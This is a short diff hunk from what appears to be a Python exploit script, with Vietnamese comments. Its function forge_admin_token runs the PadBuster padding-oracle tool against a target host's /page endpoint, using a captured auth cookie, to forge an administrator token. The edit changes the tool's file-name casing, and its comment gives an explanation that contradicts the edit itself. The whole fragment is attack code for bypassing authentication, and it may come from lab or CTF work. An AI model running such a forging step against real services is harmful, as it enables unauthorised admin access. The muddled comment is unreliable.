@@ -37,7 +37,7 @@ def forge_admin_token(host, sample_token_hex):
     # -noiv: token KHÔNG có khối IV ghép ở đầu (bỏ tham số này nếu token dài hơn số khối dữ liệu 1 khối)
     out = subprocess.run(
         [
-            "perl", "PadBuster.pl",
+            "perl", "padBuster.pl",   # tên file đúng là chữ B thường ở "pad" -- Linux phân biệt hoa/thường, gõ sai là báo "No such file"
             f"http://{host}/page",
             sample_token_hex, "16",
             "-cookies", f"auth={sample_token_hex}",
